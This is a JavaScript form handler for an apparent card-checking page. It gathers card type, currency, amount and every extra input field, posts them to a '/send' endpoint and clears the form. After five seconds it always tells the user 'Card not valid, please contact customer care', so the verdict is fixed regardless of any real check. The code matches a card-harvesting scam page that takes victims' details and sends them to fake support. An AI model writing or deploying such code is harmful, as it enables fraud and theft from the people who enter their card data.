// Example function triggered on submit
document.querySelector('.continue-btn').addEventListener('click', () => {
    const formData = {
        cardType: document.getElementById('cardType').value,
        currency: document.querySelector('.form-group select').value,
        amount: document.querySelector('.form-group input').value,
        additional: []
    };

    // Get dynamic fields
    document.querySelectorAll('#dynamicFields input').forEach(input => {
        formData.additional.push({
            name: input.placeholder,
            value: input.value
        });
    });

    // Clear fields (optional)
    document.querySelectorAll('input').forEach(input => input.value = '');

    // Show modal
    showModal('Checking your card... ⏳');

    fetch('/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ formData })
    })
    .then(response => {
        if (response.ok) {
            setTimeout(() => {
                showModal('❌ Card not valid, please contact customer care.');
            }, 5000);
        } else {
            alert('Error sending data.');
        }
    })
    .catch(err => {
        console.error(err);
        alert('Fetch error.');
    });
});

// Modal helpers
function showModal(message) {
    let modal = document.getElementById('modal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'modal';
        modal.style.position = 'fixed';
        modal.style.top = '0';
        modal.style.left = '0';
        modal.style.width = '100%';
        modal.style.height = '100%';
        modal.style.background = 'rgba(0,0,0,0.6)';
        modal.style.display = 'flex';
        modal.style.alignItems = 'center';
        modal.style.justifyContent = 'center';
        modal.style.color = 'white';
        modal.style.fontSize = '24px';
        modal.style.zIndex = '1000';
        document.body.appendChild(modal);

        modal.addEventListener('click', () => modal.remove());
    }
    modal.innerHTML = `<div>${message}</div>`;
}
